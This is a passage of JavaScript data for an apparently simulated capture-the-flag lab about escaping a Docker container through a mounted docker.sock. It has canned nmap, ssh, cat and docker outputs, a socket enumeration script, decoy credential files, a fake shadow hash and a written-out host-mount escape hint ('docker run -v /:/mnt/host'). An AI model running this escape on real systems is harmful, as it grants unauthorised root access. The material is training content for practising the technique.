                                            content: '#!/bin/bash\n# linPEAS - Linux Privilege Escalation Awesome Script\n# (Simulated — full version at github.com/carlospolop/PEASS-ng)\necho "linPEAS would run here in a real engagement."\necho "For this box, focus on Docker-specific enumeration:"\necho "  - ls -la /var/run/docker.sock"\necho "  - capsh --print"\necho "  - cat /proc/1/cgroup"\necho "  - mount | grep docker"'
                                        }
                                    }
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'docker_enum.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\ndocker_enum.py — Enumerate Docker environment via socket\nUsage: python3 docker_enum.py\nRun from inside a container with docker.sock access\n"""\nimport json, socket, http.client\n\ndef query_docker(path):\n    conn = http.client.HTTPConnection("localhost", timeout=5)\n    conn.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    conn.sock.connect("/var/run/docker.sock")\n    conn.request("GET", path)\n    resp = conn.getresponse()\n    return json.loads(resp.read())\n\nif __name__ == "__main__":\n    print("[*] Enumerating Docker via socket...")\n    containers = query_docker("/v1.43/containers/json")\n    print(f"[+] Found {len(containers)} running containers")\n    for c in containers:\n        print(f"    - {c[\'Names\'][0]}: {c[\'Image\']}")\n    info = query_docker("/v1.43/info")\n    print(f"[+] Docker version: {info.get(\'ServerVersion\', \'unknown\')}")\n    print(f"[+] OS: {info.get(\'OperatingSystem\', \'unknown\')}")'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.10.14.40\ncurl http://10.10.14.40/vault/\nfirefox http://10.10.14.40/vault/\nssh archivist@10.10.14.40 -p 2222'
                                },
                                '.ssh': {
                                    type: 'dir',
                                    children: {
                                        'known_hosts': {
                                            type: 'file',
                                            content: '10.10.14.40 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKxHf...'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\napi\nbackup\ncgi-bin\nconfig\ndata\ndocs\nimages\nindex\nlogin\nstatus\ntest\nupload\nvault'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ===============================================================
    // TERMINAL COMMANDS (box-specific tools)
    // ===============================================================

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [Scan Type(s)] [Options] {target specification}\nExample: nmap -sV 10.10.14.40';
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target || target === '10.10.14.40') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.40
Host is up (0.032s latency).
Not shown: 996 closed tcp ports

PORT     STATE    SERVICE       VERSION
80/tcp   open     http          nginx 1.24.0
2222/tcp open     ssh           OpenSSH 9.5 (container: vault-indexer-01)
2376/tcp filtered docker        Docker daemon (TCP disabled)
5432/tcp filtered postgresql    (internal only)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 11.27 seconds

[note] Port 2222 is SSH into the vault-indexer-01 container.
       Port 2376 (Docker API) is filtered — TCP access is disabled.
       The Docker socket is Unix-only (/var/run/docker.sock).`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
All 1000 scanned ports on localhost (127.0.0.1) are closed

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds`;
        },

        'ssh': function(args, term, engine) {
            if (args.length === 0) return 'Usage: ssh [options] [user@]hostname\nExample: ssh archivist@10.10.14.40 -p 2222';
            const raw = args.join(' ');

            // Check for SSH to the container
            if (raw.includes('10.10.14.40') || raw.includes('archivist')) {
                // Must use port 2222
                if (raw.includes('2222') || raw.includes('-p 2222')) {
                    A11Config._sshSessionActive = true;
                    A11Config._hostShellActive = false;
                    return `The authenticity of host '[10.10.14.40]:2222' can't be established.
ECDSA key fingerprint is SHA256:Kx7fH9qM3bN2pL5wR8tY1uI0oP.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.14.40]:2222' (ECDSA) to the list of known hosts.

Welcome to vault-indexer-01 (Alpine Linux 3.18)
Container ID: a1b2c3d4e5f6
Role: Vault Indexer — Automated archive management

archivist@vault-indexer-01:~$

[You are now inside the vault-indexer-01 container]
[Container commands: ls, cat, id, whoami, hostname, env, mount, capsh, docker, curl, find, ps]
[Type 'exit' to return to your Kali machine]`;
                }

                return `ssh: connect to host 10.10.14.40 port 22: Connection refused

[hint] SSH on port 22 is not exposed. Check your nmap results — the container SSH is on port 2222.
       Try: ssh archivist@10.10.14.40 -p 2222`;
            }

            return `ssh: Could not resolve hostname ${args[0] || 'unknown'}: Name or service not known`;
        },

        'exit': function(args, term, engine) {
            if (A11Config._hostShellActive) {
                A11Config._hostShellActive = false;
                A11Config._sshSessionActive = true;
                return `exit
Leaving host chroot shell...
Returning to vault-indexer-01 container.

archivist@vault-indexer-01:~$`;
            }
            if (A11Config._sshSessionActive) {
                A11Config._sshSessionActive = false;
                return `logout
Connection to 10.10.14.40 closed.

[Returned to Kali machine]`;
            }
            return 'exit: not in a remote session';
        },

        // ── Container enumeration commands ──────────────────────

        'id': function(args, term, engine) {
            if (A11Config._hostShellActive) {
                return 'uid=0(root) gid=0(root) groups=0(root)';
            }
            if (A11Config._sshSessionActive) {
                return 'uid=1000(archivist) gid=1000(archivist) groups=1000(archivist),999(docker)';
            }
            return 'uid=1000(kali) gid=1000(kali) groups=1000(kali),27(sudo)';
        },

        'whoami': function(args, term, engine) {
            if (A11Config._hostShellActive) return 'root';
            if (A11Config._sshSessionActive) return 'archivist';
            return 'kali';
        },

        'hostname': function(args, term, engine) {
            if (A11Config._hostShellActive) return 'vault-host';
            if (A11Config._sshSessionActive) return 'vault-indexer-01';
            return 'kali';
        },

        'env': function(args, term, engine) {
            if (A11Config._hostShellActive) {
                return `HOSTNAME=vault-host
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/root
SHELL=/bin/bash
USER=root
LOGNAME=root`;
            }
            if (A11Config._sshSessionActive) {
                return `HOSTNAME=vault-indexer-01
CONTAINER_ID=a1b2c3d4e5f6
DOCKER_HOST=unix:///var/run/docker.sock
VAULT_ROLE=indexer
VAULT_DB_HOST=vault-db-01
VAULT_DB_PORT=5432
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOME=/home/archivist
SHELL=/bin/sh
USER=archivist
LOGNAME=archivist`;
            }
            return `HOSTNAME=kali
HOME=/home/kali
USER=kali
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`;
        },

        'mount': function(args, term, engine) {
            if (A11Config._hostShellActive) {
                return `/dev/sda1 on / type ext4 (rw,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
/dev/sda2 on /boot type ext4 (rw,relatime)`;
            }
            if (A11Config._sshSessionActive) {
                return `overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/...)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /var/run/docker.sock type tmpfs (rw,nosuid,relatime)
/dev/sda1 on /var/run/docker.sock type ext4 (rw,relatime)

[!] Note: /var/run/docker.sock is mounted from the host filesystem`;
            }
            return 'mount: no filesystems mounted (use with args on real system)';
        },

        'capsh': function(args, term, engine) {
            if (!A11Config._sshSessionActive && !A11Config._hostShellActive) {
                return 'capsh: command not available (run from inside the container)';
            }
            if (A11Config._hostShellActive) {
                return `Current: =ep
Bounding set: =ep
Ambient set:
Current IAB:
Securebits: 00/0x0/1\'b0

[*] Full capabilities — you are root on the host.`;
            }
            // Inside container
            return `Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Ambient set:
Current IAB:
Securebits: 00/0x0/1'b0

[!] Container has elevated capabilities (not fully privileged, but more than default).
[!] Combined with docker.sock access, this enables container escape.`;
        },

        'ps': function(args, term, engine) {
            if (A11Config._hostShellActive) {
                return `  PID TTY          TIME CMD
    1 ?        00:00:12 systemd
  412 ?        00:00:03 dockerd
  489 ?        00:00:01 containerd
  623 ?        00:00:00 sshd
  901 ?        00:00:04 nginx
 1102 pts/0    00:00:00 bash
 1140 pts/0    00:00:00 ps`;
            }
            if (A11Config._sshSessionActive) {
                return `  PID TTY          TIME CMD
    1 ?        00:00:08 python3 /app/indexer.py
   42 ?        00:00:01 /usr/sbin/sshd
   88 pts/0    00:00:00 sh
  102 pts/0    00:00:00 ps`;
            }
            return `  PID TTY          TIME CMD
 1001 pts/0    00:00:00 bash
 1042 pts/0    00:00:00 ps`;
        },

        'find': function(args, term, engine) {
            const raw = args.join(' ');

            if (A11Config._hostShellActive) {
                if (raw.includes('master_manifest') || raw.includes('/opt')) {
                    return '/opt/master_manifest.txt';
                }
                if (raw.includes('flag') || raw.includes('.txt')) {
                    return `/opt/master_manifest.txt
/root/root.txt`;
                }
                return 'find: specify a search path and pattern';
            }

            if (A11Config._sshSessionActive) {
                if (raw.includes('docker.sock') || raw.includes('/var/run')) {
                    return '/var/run/docker.sock';
                }
                if (raw.includes('.sock')) {
                    return '/var/run/docker.sock';
                }
                if (raw.includes('flag') || raw.includes('user.txt')) {
                    return '/var/log/vault/user.txt';
                }
                return 'find: specify a search path and pattern';
            }

            return 'find: specify a search path and pattern';
        },

        // ── The critical ls command — discovers docker.sock ─────

        'ls': function(args, term, engine) {
            const raw = args.join(' ');
            const target = args.find(a => !a.startsWith('-')) || '';
            const longFormat = args.includes('-la') || args.includes('-l') || args.includes('-al');

            // ── Host shell filesystem ──
            if (A11Config._hostShellActive) {
                if (target.includes('/opt') || target === '/opt' || target === '/opt/') {
                    if (longFormat) {
                        return `total 8
drwxr-xr-x  2 root root 4096 Dec  1 08:14 .
drwxr-xr-x 22 root root 4096 Nov 28 15:30 ..
-rw-r--r--  1 root root  287 Dec  1 08:14 master_manifest.txt`;
                    }
                    return 'master_manifest.txt';
                }
                if (target === '/root' || target === '/root/') {
                    if (longFormat) {
                        return `total 12
drwx------  3 root root 4096 Nov 28 15:30 .
drwxr-xr-x 22 root root 4096 Nov 28 15:30 ..
-rw-------  1 root root   45 Dec  1 08:14 root.txt
-rw-r--r--  1 root root  220 Nov 28 15:30 .bash_logout
-rw-r--r--  1 root root 3526 Nov 28 15:30 .bashrc`;
                    }
                    return 'root.txt';
                }
                if (target === '/' || target === '') {
                    return 'bin  boot  dev  etc  home  lib  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var';
                }
                if (target === '/mnt/host' || target === '/mnt/host/') {
                    return 'bin  boot  dev  etc  home  lib  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var';
                }
                return `ls: cannot access '${target}': directory listing simulated for key paths only`;
            }

            // ── Container filesystem ──
            if (A11Config._sshSessionActive) {
                if (target.includes('/var/run/docker.sock') || raw.includes('/var/run/docker.sock')) {
                    if (longFormat) {
                        return `srw-rw---- 1 root docker 0 Dec  2 14:22 /var/run/docker.sock

[!] Docker socket is accessible! The 'archivist' user is in the 'docker' group.
[!] This means you can communicate with the Docker daemon on the host.`;
                    }
                    return '/var/run/docker.sock';
                }
                if (target.includes('/var/run') || target === '/var/run' || target === '/var/run/') {
                    if (longFormat) {
                        return `total 8
drwxr-xr-x 3 root root   120 Dec  2 14:22 .
drwxr-xr-x 1 root root  4096 Dec  2 14:22 ..
srw-rw---- 1 root docker    0 Dec  2 14:22 docker.sock
-rw-r--r-- 1 root root      4 Dec  2 14:22 sshd.pid`;
                    }
                    return 'docker.sock  sshd.pid';
                }
                if (target === '/var/log/vault' || target === '/var/log/vault/') {
                    if (longFormat) {
                        return `total 12
drwxr-xr-x 2 archivist archivist 4096 Dec  2 14:22 .
drwxr-xr-x 3 root      root      4096 Dec  2 14:22 ..
-rw-r--r-- 1 archivist archivist  142 Dec  2 14:22 indexer.log
-rw-r--r-- 1 archivist archivist   43 Dec  2 14:22 user.txt`;
                    }
                    return 'indexer.log  user.txt';
                }
                if (target === '/app' || target === '/app/') {
                    if (longFormat) {
                        return `total 28
drwxr-xr-x 2 archivist archivist 4096 Dec  1 08:14 .
drwxr-xr-x 1 root      root      4096 Dec  2 14:22 ..
-rwxr-xr-x 1 archivist archivist 2841 Dec  1 08:14 indexer.py
-rw-r--r-- 1 archivist archivist  412 Dec  1 08:14 config.yaml
-rw-r--r-- 1 archivist archivist   89 Dec  1 08:14 requirements.txt
-rw-r--r-- 1 root      root       631 Nov 30 09:44 Dockerfile
-rw-r--r-- 1 archivist archivist  188 Dec  1 08:14 .env.bak`;
                    }
                    return 'Dockerfile  .env.bak  config.yaml  indexer.py  requirements.txt';
                }
                if (target === '/var/backups' || target === '/var/backups/') {
                    if (longFormat) {
                        return `total 20
drwxr-xr-x 2 root      root      4096 Nov 28 15:30 .
drwxr-xr-x 1 root      root      4096 Dec  2 14:22 ..
-rw-r--r-- 1 root      root      1024 Nov 28 15:30 docker-compose.bak.yml
-rw-r--r-- 1 root      root       256 Nov 28 15:30 vault_creds_old.txt
-rw-r--r-- 1 root      root       512 Nov 29 11:10 mount_test_volume.log`;
                    }
                    return 'docker-compose.bak.yml  mount_test_volume.log  vault_creds_old.txt';
                }
                if (target === '' || target === '~' || target === '/home/archivist') {
                    if (longFormat) {
                        return `total 12
drwxr-xr-x 2 archivist archivist 4096 Dec  2 14:22 .
drwxr-xr-x 1 root      root      4096 Dec  2 14:22 ..
-rw-r--r-- 1 archivist archivist  220 Dec  1 08:14 .profile
-rw------- 1 archivist archivist  142 Dec  2 14:22 .ash_history`;
                    }
                    return '.ash_history  .profile';
                }
                if (target === '/' || target === '') {
                    return 'app  bin  dev  etc  home  lib  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var';
                }
                return `ls: ${target}: No such file or directory`;
            }

            // ── Kali filesystem — handled by BoxEngine built-in ls ──
            return null;  // fall through to built-in
        },

        'cat': function(args, term, engine) {
            const target = args.join(' ').trim();

            // ── Host shell ──
            if (A11Config._hostShellActive) {
                if (target === '/opt/master_manifest.txt') {
                    return `=== ARCHIVIST GUILD — MASTER MANIFEST ===
Classification: TOP SECRET / GUILD EYES ONLY

Archive Locations:
  Vault-Alpha:   /data/archives/alpha/   (Historical Records — 1.2TB)
  Vault-Beta:    /data/archives/beta/    (Financial Ledgers — 890GB)
  Vault-Gamma:   /data/archives/gamma/   (Personnel Files — 340GB)
  Vault-Delta:   /data/archives/delta/   (Research Data — 2.1TB)

Master Encryption Key: AES-256-GCM
Key ID: guild-master-2024-v3

Docker Host Credentials:
  root password hash: $6$rounds=65536$GuildS4lt$...
  Docker registry: registry.archivist-guild.internal:5000

Root Flag: {{FLAG:root}}

--- END OF MANIFEST ---`;
                }
                if (target === '/root/root.txt') {
                    return '{{FLAG:root}}';
                }
                if (target === '/etc/hostname') {
                    return 'vault-host';
                }
                if (target === '/etc/passwd') {
                    return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
archivist:x:1001:1001:Archivist Service:/home/archivist:/bin/sh
postgres:x:999:999:PostgreSQL:/var/lib/postgresql:/usr/sbin/nologin
dockerd:x:998:998:Docker Daemon:/var/lib/docker:/usr/sbin/nologin`;
                }
                if (target === '/etc/shadow') {
                    return `root:$6$rounds=65536$GuildS4lt$kX9jL7mN2pQ8rT4vW6yA1bC3dE5fG7hI9jK0lM2n:19693:0:99999:7:::
archivist:$6$ArChIvIsT$mP3nQ5rS7tU9vW1xY3zA5bC7dE9fG1hI3jK5lM7n:19693:0:99999:7:::`;
                }
                if (target === '/etc/docker/daemon.json') {
                    return `{
  "storage-driver": "overlay2",
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  },
  "hosts": ["unix:///var/run/docker.sock"],
  "tls": false
}`;
                }
                return `cat: ${target}: No such file or directory`;
            }

            // ── Container shell ──
            if (A11Config._sshSessionActive) {
                if (target === '/var/log/vault/user.txt') {
                    return `{{FLAG:user}}

Docker socket confirmed accessible.
The indexer container has been misconfigured with socket mount access.
This flag confirms successful container enumeration.`;
                }
                if (target === '/var/log/vault/indexer.log') {
                    return `[2024-12-02 14:22:31] INFO  Indexer started (PID 1)
[2024-12-02 14:22:32] INFO  Connected to vault-db-01:5432
[2024-12-02 14:22:33] INFO  Docker socket detected: /var/run/docker.sock
[2024-12-02 14:22:33] WARN  Socket mount enabled — required for self-healing mode
[2024-12-02 14:25:01] INFO  Scheduled index refresh complete (4 containers scanned)`;
                }
                if (target === '/app/config.yaml') {
                    return `# Vault Indexer Configuration
vault:
  database:
    host: vault-db-01
    port: 5432
    name: archival_records
    user: indexer_svc
    password: idx_s3rv1c3_2024

docker:
  socket: /var/run/docker.sock
  self_heal: true
  health_check_interval: 300

logging:
  path: /var/log/vault/
  level: INFO`;
                }
                if (target === '/app/indexer.py') {
                    return `#!/usr/bin/env python3
"""Vault Indexer Service — Archivist Guild"""
import docker, time, logging

logging.basicConfig(filename='/var/log/vault/indexer.log', level=logging.INFO)
client = docker.from_env()

def health_check():
    """Check all vault containers are running"""
    for c in client.containers.list():
        if c.status != 'running' and 'vault' in c.name:
            logging.warning(f"Container {c.name} is {c.status}, restarting...")
            c.restart()

def index_archives():
    """Refresh archive index from vault-db-01"""
    # ... database query logic ...
    pass

if __name__ == '__main__':
    logging.info(f"Indexer started (PID 1)")
    while True:
        health_check()
        index_archives()
        time.sleep(300)`;
                }
                if (target === '/app/requirements.txt') {
                    return 'docker==6.1.3\npsycopg2-binary==2.9.9\npyyaml==6.0.1';
                }
                // ── Decoy files — plausible but misleading ──────────
                if (target === '/app/Dockerfile') {
                    return `FROM python:3.11-slim-alpine

LABEL maintainer="infra@archivist-guild.internal"
LABEL version="2.4"
LABEL description="Vault Indexer — Automated archive management service"

# [DECOY] This Dockerfile does NOT show the socket mount —
# that is configured at runtime in docker-compose.yml.
# The Dockerfile itself looks completely benign.

RUN apk add --no-cache openssh-server curl

# Create service account
RUN addgroup -S archivist && adduser -S -G archivist archivist
RUN addgroup archivist docker

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY indexer.py config.yaml ./

# SSH for "maintenance access" (port 2222 exposed in compose)
COPY sshd_config /etc/ssh/
RUN ssh-keygen -A

EXPOSE 22

CMD ["python3", "/app/indexer.py"]

# Note: docker.sock mount is defined in docker-compose.yml:
#   volumes:
#     - /var/run/docker.sock:/var/run/docker.sock
# This is intentional for self-healing orchestration. DO NOT REMOVE.
# -- DevOps Team, 2024-11-28`;
                }
                if (target === '/app/.env.bak') {
                    return `# Backup env file — OUTDATED, do not use
# Rotate these credentials — they have been superseded

VAULT_DB_HOST=vault-db-01
VAULT_DB_PORT=5432
VAULT_DB_USER=indexer_svc
VAULT_DB_PASS=idx_OLD_p4ss_2023

DOCKER_HOST=unix:///var/run/docker.sock
VAULT_REGISTRY=registry.archivist-guild.internal:5000
VAULT_REGISTRY_USER=push_bot
VAULT_REGISTRY_PASS=r3g1stry_push_2023_ROTATED

# [DECOY] These credentials are stale and will not work on current systems.
# The active credentials are in config.yaml (idx_s3rv1c3_2024).
# This file was left as a breadcrumb for compliance audit trails.`;
                }
                if (target === '/var/backups/docker-compose.bak.yml') {
                    return `# docker-compose.yml — Archivist Guild Vault Stack
# BACKUP COPY — do not deploy directly
# Active file is on the Docker host at /opt/guild/docker-compose.yml

version: '3.8'

services:
  vault-web-01:
    image: nginx:1.24-alpine
    ports:
      - "80:80"
    networks:
      - vault_network

  vault-indexer-01:
    image: archivist/indexer:2.4
    ports:
      - "2222:22"
    volumes:
      # [!] CRITICAL MISCONFIGURATION — Docker socket bind-mount
      # Originally added 2024-11-28 for "self-healing" feature.
      # SECURITY REVIEW PENDING — this grants host root via docker group.
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
      - vault_network
    environment:
      - DOCKER_HOST=unix:///var/run/docker.sock

  vault-db-01:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: archival_records
      POSTGRES_USER: indexer_svc
      POSTGRES_PASSWORD: idx_s3rv1c3_2024
    networks:
      - vault_network

  vault-logs-01:
    image: fluentd:v1.16
    networks:
      - vault_network

networks:
  vault_network:
    driver: bridge

# [DECOY NOTE] You found the compose file — well done.
# But the escape is through the live socket, not this backup.
# docker run -v /:/mnt/host ...`;
                }
                if (target === '/var/backups/vault_creds_old.txt') {
                    return `# Vault Credentials Archive — 2023 Rotation Log
# [DECOY] All entries below are ROTATED and non-functional.

vault-web-01  admin:vaultAdmin2023!
vault-db-01   postgres:db_guild_2023
vault-db-01   indexer_svc:idx_s3rv1c3_2023

SSH (container):  archivist:arch1v1st_2023
SSH (host):       guild-ops:g41ld0ps_2023

Guild Master Key Backup: /data/keys/master-2023.key (DELETED after rotation)

Note: Current credentials are in /app/config.yaml (vault-indexer-01).
Docker socket access supersedes credential-based auth for container escape.`;
                }
                if (target === '/var/backups/mount_test_volume.log') {
                    return `[2024-11-29 11:10:22] INFO  Volume mount test initiated
[2024-11-29 11:10:22] INFO  Testing bind mount: /var/run/docker.sock → /var/run/docker.sock
[2024-11-29 11:10:23] INFO  Socket accessible from container context: YES
[2024-11-29 11:10:23] INFO  docker group membership verified: archivist
[2024-11-29 11:10:24] WARN  Security note: socket mount grants daemon access from container
[2024-11-29 11:10:24] INFO  Test command: docker ps → 4 containers listed (OK)
[2024-11-29 11:10:25] INFO  Self-healing test: restart simulation → vault-logs-01 (OK)
[2024-11-29 11:10:25] INFO  Volume mount test PASSED — proceeding to production deploy

# [DECOY] This log file confirms the socket mount was a deliberate (if misguided)
# infrastructure decision. The security review ticket was never actioned.
# See JIRA INFRA-4421: "Docker socket security audit" — status: OPEN`;
                }
                if (target === '/proc/1/cgroup') {
                    return `12:devices:/docker/a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890
11:cpuset:/docker/a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890
10:memory:/docker/a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890
9:blkio:/docker/a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890

[*] Cgroup paths confirm this is a Docker container.`;
                }
                if (target === '/etc/hostname') {
                    return 'vault-indexer-01';
                }
                if (target === '/etc/hosts') {
                    return `127.0.0.1  localhost
172.18.0.2 vault-indexer-01
172.18.0.3 vault-web-01
172.18.0.4 vault-db-01
172.18.0.5 vault-logs-01`;
                }
                if (target === '/etc/resolv.conf') {
                    return `nameserver 127.0.0.11
options ndots:0`;
                }
                return `cat: ${target}: No such file or directory`;
            }

            // Kali filesystem — fall through to built-in
            return null;
        },

        // ── The Docker CLI — the key exploitation tool ──────────

        'docker': function(args, term, engine) {
            if (!A11Config._sshSessionActive && !A11Config._hostShellActive) {
                return `docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock.
Is the docker daemon running?

[hint] Docker is running on the TARGET (10.10.14.40), not on your Kali machine.
       SSH into the container first: ssh archivist@10.10.14.40 -p 2222`;
            }

            const subcmd = args[0] || '';
            const raw = args.join(' ');

            // ── docker ps ──
            if (subcmd === 'ps') {
                if (args.includes('-a') || args.includes('--all')) {
                    return `CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS                    PORTS                  NAMES
a1b2c3d4e5f6   archivist/indexer:2.4     "python3 /app/index..."   3 days ago     Up 3 days                                        vault-indexer-01
b2c3d4e5f6a1   nginx:1.24-alpine        "nginx -g 'daemon o..."   3 days ago     Up 3 days                 0.0.0.0:80->80/tcp     vault-web-01
c3d4e5f6a1b2   postgres:16-alpine       "docker-entrypoint.s..."  3 days ago     Up 3 days                 5432/tcp               vault-db-01
d4e5f6a1b2c3   fluentd:v1.16            "tini -- /bin/entryp..."   3 days ago     Up 2 days (degraded)                             vault-logs-01
e5f6a1b2c3d4   alpine:3.18              "/bin/sh"                  5 days ago     Exited (0) 5 days ago                            test-container`;
                }
                return `CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS         PORTS                  NAMES
a1b2c3d4e5f6   archivist/indexer:2.4     "python3 /app/index..."   3 days ago     Up 3 days                                 vault-indexer-01
b2c3d4e5f6a1   nginx:1.24-alpine        "nginx -g 'daemon o..."   3 days ago     Up 3 days      0.0.0.0:80->80/tcp        vault-web-01
c3d4e5f6a1b2   postgres:16-alpine       "docker-entrypoint.s..."  3 days ago     Up 3 days      5432/tcp                  vault-db-01
d4e5f6a1b2c3   fluentd:v1.16            "tini -- /bin/entryp..."   3 days ago     Up 2 days                                vault-logs-01`;
            }

            // ── docker images ──
            if (subcmd === 'images') {
                return `REPOSITORY               TAG           IMAGE ID       CREATED        SIZE
archivist/indexer         2.4           4a5b6c7d8e9f   5 days ago     89.2MB
nginx                    1.24-alpine   1a2b3c4d5e6f   2 weeks ago    41.1MB
postgres                 16-alpine     7a8b9c0d1e2f   2 weeks ago    233MB
fluentd                  v1.16         3a4b5c6d7e8f   3 weeks ago    52.4MB
alpine                   3.18          9a0b1c2d3e4f   4 weeks ago    7.34MB
alpine                   latest        5e6f7a8b9c0d   4 weeks ago    7.34MB`;
            }

            // ── docker info ──
            if (subcmd === 'info') {
                return `Client: Docker Engine - Community
 Version:    24.0.7
 Context:    default
 Debug Mode: false

Server:
 Containers: 5
  Running: 4
  Paused: 0
  Stopped: 1
 Images: 6
 Server Version: 24.0.7
 Storage Driver: overlay2
  Backing Filesystem: extfs
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Cgroup Version: 2
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
 Kernel Version: 5.15.0-88-generic
 Operating System: Ubuntu 22.04.3 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 4
 Total Memory: 7.773GiB
 Name: vault-host
 Docker Root Dir: /var/lib/docker
 Security Options: apparmor seccomp
 WARNING: No swap limit support

[*] You now have full visibility into the Docker daemon from inside the container.
[*] The socket at /var/run/docker.sock is giving you host-level Docker access.`;
            }

            // ── docker inspect ──
            if (subcmd === 'inspect') {
                const containerName = args[1] || '';
                if (containerName.includes('vault-indexer') || containerName === 'a1b2c3d4e5f6') {
                    return `[
  {
    "Id": "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890",
    "Name": "/vault-indexer-01",
    "Image": "archivist/indexer:2.4",
    "State": {
      "Status": "running",
      "Running": true,
      "Pid": 1102
    },
    "HostConfig": {
      "Binds": [
        "/var/run/docker.sock:/var/run/docker.sock"
      ],
      "Privileged": false,
      "CapAdd": ["NET_ADMIN", "SYS_PTRACE"],
      "NetworkMode": "vault_network"
    },
    "Mounts": [
      {
        "Type": "bind",
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock",
        "Mode": "rw",
        "RW": true
      }
    ],
    "NetworkSettings": {
      "Networks": {
        "vault_network": {
          "IPAddress": "172.18.0.2",
          "Gateway": "172.18.0.1"
        }
      }
    }
  }
]

[!] CRITICAL: /var/run/docker.sock is bind-mounted into this container with RW access.
[!] This is the escape vector — you can control the Docker daemon from here.`;
                }
                return `Error: No such container: ${containerName}`;
            }

            // ── docker exec ──
            if (subcmd === 'exec') {
                const containerName = args.find(a => a.startsWith('vault-') || /^[a-f0-9]{12}$/.test(a)) || '';
                if (!containerName) {
                    return 'Error: "docker exec" requires at least 2 arguments.\nUsage: docker exec [OPTIONS] CONTAINER COMMAND [ARG...]';
                }
                const cmd = args.slice(args.indexOf(containerName) + 1).join(' ');
                if (cmd.includes('cat /etc/hostname')) {
                    if (containerName.includes('web')) return 'vault-web-01';
                    if (containerName.includes('db')) return 'vault-db-01';
                    if (containerName.includes('logs')) return 'vault-logs-01';
                    if (containerName.includes('indexer')) return 'vault-indexer-01';
                    return containerName;
                }
                if (cmd.includes('whoami') || cmd.includes('id')) {
                    return 'root';
                }
                return `exec into ${containerName}: ${cmd || 'specify a command'}`;
            }

            // ── docker run — THE ESCAPE COMMAND ──────────────────
            if (subcmd === 'run') {
